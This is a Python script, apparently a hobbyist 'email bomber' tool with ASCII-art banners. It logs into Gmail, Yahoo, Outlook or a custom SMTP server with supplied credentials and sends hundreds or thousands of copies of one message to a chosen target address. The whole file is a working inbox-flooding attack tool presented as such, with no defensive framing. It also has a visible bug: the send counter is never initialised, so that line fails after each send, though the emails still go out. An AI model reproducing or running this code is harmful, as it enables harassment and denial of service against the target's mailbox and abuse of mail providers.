import smtplib
import sys

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

def banner():
    print(bcolors.GREEN + '''
    /\\_/\\
   ( o.o )   
    > ^ <
    (o o) 
      ) )   <Mighty's Bomber v1.0>
     ( (     
      \\ \\
       `-`''')
    print(bcolors.GREEN + '''
    +[+[+[ Mighty’s Bomber v1.0 ]+]+]+
    +[+[+[ Made with codes ]+]+]+
    ''')
    print(bcolors.GREEN + '''
                     \|/
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,         
             |#########################|        
            |###########################|       
           |#######  Mighty Bomb  #######|
           |#############################|              Author: Mightyrock05
           |#############################|
            |###########################|
             \#########################/
              `.#####################,'
                `._###############_,'
                   `--..#####..--'                                
*.______________________________________________________________,
                                                                    ''')

class EmailBomber:
    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.target = str(input(bcolors.GREEN + 'Enter target email: '))
            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom): '))
            if self.mode not in [1, 2, 3, 4]:
                print('ERROR: Invalid Option. Goodbye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def setup_bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
            if self.mode == 1:
                self.amount = 1000
            elif self.mode == 2:
                self.amount = 500
            elif self.mode == 3:
                self.amount = 250
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount: '))
            print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def setup_email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(input(bcolors.GREEN + 'Enter email server or select premade options - 1:Gmail 2:Yahoo 3:Outlook: '))
            premade = {'1': 'smtp.gmail.com', '2': 'smtp.mail.yahoo.com', '3': 'smtp-mail.outlook.com'}
            if self.server in premade:
                self.server = premade[self.server]
                self.port = 587
            else:
                self.port = int(input(bcolors.GREEN + 'Enter port number: '))

            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address: '))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password: '))
            self.subject = str(input(bcolors.GREEN + 'Enter subject: '))
            self.message = str(input(bcolors.GREEN + 'Enter message: '))

            self.msg = f'From: {self.fromAddr}\nTo: {self.target}\nSubject: {self.subject}\n{self.message}\n'
            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send_email(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            EmailBomber.count += 1
            print(bcolors.YELLOW + f'BOMB: {EmailBomber.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
        for _ in range(self.amount):
            self.send_email()
        self.s.close()
        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)

if __name__ == '__main__':
    banner()
    bomb = EmailBomber()
    bomb.setup_bomb()
    bomb.setup_email()
    bomb.attack()
